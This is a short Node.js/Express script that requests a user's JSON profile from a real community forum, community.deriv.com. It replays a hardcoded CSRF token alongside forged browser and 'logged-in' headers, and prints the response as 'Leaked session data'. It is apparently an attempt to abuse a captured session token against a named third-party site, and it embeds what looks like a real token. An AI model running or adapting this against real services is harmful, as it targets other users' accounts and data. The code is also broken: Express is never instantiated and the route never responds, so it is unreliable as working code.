
const app=require('express')



app.get("/",(req,res,next)=>{

fetch("https://community.deriv.com/u/acronyx-altezza-2.json", {
  method: "GET",
  credentials: "include", // VERY IMPORTANT for session-based access
  headers: {
    "Sec-CH-UA-Platform": "\"Android\"",
    "X-CSRF-Token": "ad891vhr7dfMeOP7mXkue18pTm92rimsSNt8oEc-2rzFWq2_z1BtIumWQDKFzz8cEWuMvOdxgNWvNLj118BIug",
    "Sec-CH-UA": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
    "Sec-CH-UA-Mobile": "?1",
    "Discourse-Track-View": "true",
    "Discourse-Logged-In": "true",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Discourse-Present": "true",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://community.deriv.com/",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=1, i"
  }
})
.then(res => res.json())
.then(data => {
  console.log("Leaked session data:", data);
})
.catch(err => console.error(err));


})



app.listen(8000,(daata)=>console.log("server running"))